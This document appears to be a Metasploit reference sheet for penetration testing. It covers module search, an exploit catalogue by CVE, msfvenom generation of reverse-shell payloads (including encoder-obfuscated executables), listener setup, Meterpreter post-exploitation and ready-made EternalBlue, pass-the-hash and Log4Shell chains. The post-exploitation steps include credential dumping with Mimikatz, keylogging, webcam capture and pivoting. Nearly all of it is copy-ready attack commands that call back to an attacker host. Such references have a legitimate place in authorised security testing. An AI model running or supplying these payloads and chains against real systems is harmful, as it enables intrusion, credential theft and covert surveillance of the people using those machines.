# Metasploit Exploitation Reference

Complete reference for Metasploit Framework — exploitation, post-exploitation, and payload generation for VAPT assessments.

## Installation

```bash
# macOS (Homebrew)
brew install metasploit

# Quick install (Linux/macOS)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

# Docker
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

## msfconsole — Primary Interface

### Launch
```bash
msfconsole                    # Interactive console
msfconsole -q                 # Quiet mode (no banner)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"  # Resource script
msfconsole -r script.rc       # Run resource script
```

### Core Commands

| Command | Description |
|---------|-------------|
| `search <term>` | Search modules |
| `use <module>` | Select module |
| `info` | Show module info |
| `show options` | Show configuration options |
| `show payloads` | Show compatible payloads |
| `show targets` | Show compatible targets |
| `set <OPTION> <VALUE>` | Set option |
| `setg <OPTION> <VALUE>` | Set global option |
| `unset <OPTION>` | Unset option |
| `run` / `exploit` | Execute module |
| `run -j` | Run as background job |
| `check` | Check if target is vulnerable (non-intrusive) |
| `back` | Deselect module |
| `sessions` | List active sessions |
| `sessions -i <ID>` | Interact with session |
| `sessions -k <ID>` | Kill session |
| `jobs` | List background jobs |
| `route` | Route through session |
| `db_status` | Database status |
| `workspace` | Switch workspace |

### Search Examples
```bash
search type:exploit platform:windows smb
search cve:2017-0144
search name:eternalblue
search type:auxiliary name:scanner
search type:post platform:windows name:credentials
```

---

## Exploit Modules by Target

### Windows Exploits

| Module | CVE | Description | Target Service |
|--------|-----|-------------|----------------|
| `exploit/windows/smb/ms17_010_eternalblue` | CVE-2017-0144 | EternalBlue | SMB (Win7/2008) |
| `exploit/windows/smb/ms17_010_psexec` | CVE-2017-0144 | EternalBlue PSExec | SMB |
| `exploit/windows/smb/psexec` | - | PSExec with creds | SMB |
| `exploit/windows/smb/smb_exec` | - | SMB command execution | SMB |
| `exploit/windows/http/iis_webdav_uploadasp` | - | IIS WebDAV upload | IIS |
| `exploit/windows/http/apache_mod_cgi_bash_env` | CVE-2014-6271 | Shellshock | Apache |
| `exploit/windows/winrm/winrm_soap_powershell` | - | WinRM code exec | WinRM |
| `exploit/windows/mysql/mysql_mof` | - | MySQL MOF exec | MySQL |
| `exploit/windows/mssql/mssql_payload` | - | MSSQL payload exec | MSSQL |
| `exploit/windows/ldap/ad_cs_cert_template` | CVE-2021-42278 | AD CS abuse | ADCS |

### Linux Exploits

| Module | CVE | Description | Target Service |
|--------|-----|-------------|----------------|
| `exploit/linux/http/apache_mod_cgi_bash_env_exec` | CVE-2014-6271 | Shellshock | Apache |
| `exploit/multi/http/php_cgi_arg_injection` | CVE-2012-1823 | PHP CGI injection | PHP |
| `exploit/linux/samba/is_known_pipename` | CVE-2017-7494 | Samba trans2open | Samba |
| `exploit/linux/ftp/vsftpd_234_backdoor` | CVE-2011-2523 | VSFTPD backdoor | FTP |
| `exploit/linux/http/nostromo_code_exec` | CVE-2019-16278 | Nostromo RCE | HTTP |
| `exploit/multi/http/webmin_backdoor` | CVE-2019-15107 | Webmin backdoor | Webmin |
| `exploit/linux/local/sudo_baron_samedit` | CVE-2021-3156 | Sudo heap overflow | Local |
| `exploit/linux/local/cve_2021_4034_pwnkit` | CVE-2021-4034 | Pkexec local priv esc | Local |
| `exploit/linux/local/cve_2022_0847_dirtypipe` | CVE-2022-0847 | Dirty Pipe | Local |

### Web Application Exploits

| Module | CVE | Description |
|--------|-----|-------------|
| `exploit/multi/http/struts2_content_type_ognl` | CVE-2017-5638 | Struts2 RCE |
| `exploit/multi/http/struts_dmi_rest_exec` | CVE-2016-3087 | Struts REST RCE |
| `exploit/multi/http/jenkins_cli_deserialization` | CVE-2017-1000353 | Jenkins RCE |
| `exploit/multi/http/manage_engine_dc_pmp_sqli` | CVE-2020-8242 | ManageEngine SQLi |
| `exploit/multi/http/atlassian_confluence_rce_cve_2022_26134` | CVE-2022-26134 | Confluence RCE |
| `exploit/multi/http/log4shell_header_injection` | CVE-2021-44228 | Log4Shell |

---

## Payloads

### Meterpreter Payloads (Preferred for Post-Exploitation)

| Payload | Platform | Description |
|---------|----------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows | Reverse TCP Meterpreter |
| `windows/meterpreter/reverse_https` | Windows | Reverse HTTPS Meterpreter |
| `windows/x64/meterpreter/reverse_tcp` | Windows x64 | 64-bit reverse TCP |
| `linux/meterpreter/reverse_tcp` | Linux | Linux reverse TCP |
| `linux/x64/meterpreter/reverse_tcp` | Linux x64 | 64-bit Linux reverse TCP |
| `java/meterpreter/reverse_tcp` | Java | Cross-platform Java |
| `python/meterpreter/reverse_tcp` | Python | Cross-platform Python |
| `php/meterpreter/reverse_tcp` | PHP | PHP web shell |

### Non-Meterpreter Payloads

| Payload | Platform | Description |
|---------|----------|-------------|
| `windows/shell/reverse_tcp` | Windows | Basic reverse shell |
| `cmd/unix/reverse_bash` | Unix | Bash reverse shell |
| `cmd/unix/reverse_python` | Unix | Python reverse shell |
| `cmd/unix/reverse_netcat` | Unix | Netcat reverse shell |

### Payload Generation (msfvenom)
```bash
# Windows reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Windows reverse HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe

# Linux reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# JSP payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# DLL injection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o shell.ps1

# With encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List formats
msfvenom --list formats
# List payloads
msfvenom --list payloads
```

---

## Handler (Listener)

```bash
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD windows/meterpreter/reverse_tcp;
set LHOST 10.0.0.1;
set LPORT 4444;
run -j
"
```

---

## Meterpreter Post-Exploitation

### Core Commands
```bash
sysinfo                    # System information
getuid                     # Current user
getpid                     # Current process ID
ps                         # Process list
migrate <PID>              # Migrate to another process
getsystem                  # Attempt privilege escalation
hashdump                   # Dump password hashes
load kiwi                  # Load Mimikatz
kiwi_cmd sekurlsa::logonpasswords  # Mimikatz credential dump
screenshot                 # Take screenshot
webcam_snap                # Webcam capture (if available)
keyscan_start              # Start keylogger
keyscan_dump               # Dump keystrokes
keyscan_stop               # Stop keylogger
```

### File System
```bash
cd /path                   # Change directory
ls                         # List files
cat /etc/passwd            # Read file
download /remote/file /local/path  # Download file
upload /local/file /remote/path     # Upload file
rm /path/to/file           # Delete file
mkdir /path                # Create directory
edit /path/to/file         # Edit file
search -f *password* -d C:\\  # Search for files
```

### Network
```bash
ipconfig / ifconfig         # Network interfaces
route                       # Routing table
portfwd add -l 8080 -p 80 -r target  # Port forward
portfwd list                # List port forwards
portfwd delete -l 8080     # Delete port forward
```

### Pivoting
```bash
# In msfconsole (not meterpreter)
route add 10.0.0.0 255.255.255.0 <session_id>  # Route through session
route print                                      # Show routes

# SOCKS proxy through meterpreter
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Then use proxychains with any tool
# proxychains nxc smb 10.0.1.0/24 -u admin -p 'P@ss'
```

### Token Manipulation
```bash
use incognito                    # Load incognito
list_tokens -u                   # List available tokens
impersonate_token "DOMAIN\\Admin" # Impersonate token
rev2self                         # Revert to original token
```

### Persistence (Document Only — Do Not Deploy in VAPT)
```bash
# Document persistence methods for remediation guidance
# Run persistence -h for options
# run persistence -U -i 30 -p 4444 -r 10.0.0.1
```

---

## Auxiliary Modules (Scanners)

### Port Scanning
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389,8080
set THREADS 50
run
```

### SMB Scanning
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS target
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS target
run

use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS target
run
```

### HTTP Scanning
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS target
run

use auxiliary/scanner/http/apache_userdir_enum
set RHOSTS target
run

use auxiliary/scanner/http/robots_txt
set RHOSTS target
run
```

### SSH Scanning
```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.0.0.0/24
run

use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## Post-Exploitation Modules

### Windows
```bash
use post/windows/gather/credentials/mimikatz      # Mimikatz
use post/windows/gather/hashdump                   # Hash dump
use post/windows/gather/enum_shares                 # Share enumeration
use post/windows/gather/enum_services               # Service enumeration
use post/windows/gather/enum_applications           # Installed apps
use post/windows/gather/enum_patches               # Missing patches
use post/windows/gather/enum_av                     # Antivirus detection
use post/windows/gather/enum_firewall               # Firewall rules
use post/windows/gather/credentials/saved_cs        # Chrome saved creds
use post/windows/gather/credentials/rdcman         # RDCMan creds
use post/windows/manage/enable_rdp                  # Enable RDP
use post/windows/manage/migrate                     # Migrate process
use post/multi/manage/autoroute                     # Auto-route
```

### Linux
```bash
use post/linux/gather/enum_configs                  # Config files
use post/linux/gather/enum_network                  # Network config
use post/linux/gather/enum_protections              # Security controls
use post/linux/gather/enum_users_history            # User history
use post/linux/gather/checkvm                       # VM detection
use post/multi/gather/ssh_creds                     # SSH keys
use post/multi/gather/dbvis_enum                    # DB credentials
```

---

## Database & Workspaces

```bash
workspace -a target1          # Create workspace
workspace target1             # Switch workspace
workspace -d target1           # Delete workspace
db_import nmap.xml            # Import nmap results
db_export -f xml output.xml   # Export results
hosts                         # List hosts
services                      # List services
vulns                         # List vulnerabilities
creds                         # List credentials
loot                          # List loot
notes                         # List notes
```

---

## Common VAPT Exploit Chains

### EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
check                    # Verify vulnerable
exploit                  # Exploit
```

### Pass-the-Hash with PSExec
```bash
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser admin
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
run
```

### Kerberos Attacks
```bash
# ASREPRoast (from Kali)
use auxiliary/analyze/crack_asrep
# Or use Impacket's GetNPUsers.py

# Kerberoasting (from Kali)  
use auxiliary/gather/get_user_spns
set DOMAIN domain.local
set USER_FILE users.txt
run
```

### ADCS ESC8 Abuse
```bash
# Use certipy or Impacket
# certipy req 'domain.local/user:password@ca-server' -ca ca-name -template User -alt-user admin
```

### Log4Shell (CVE-2021-44228)
```bash
use exploit/multi/http/log4shell_header_injection
set RHOSTS target
set RPORT 8080
set LHOST 10.0.0.1
set TARGET_TYPE HTTP  # or LDAP, RMI
run
```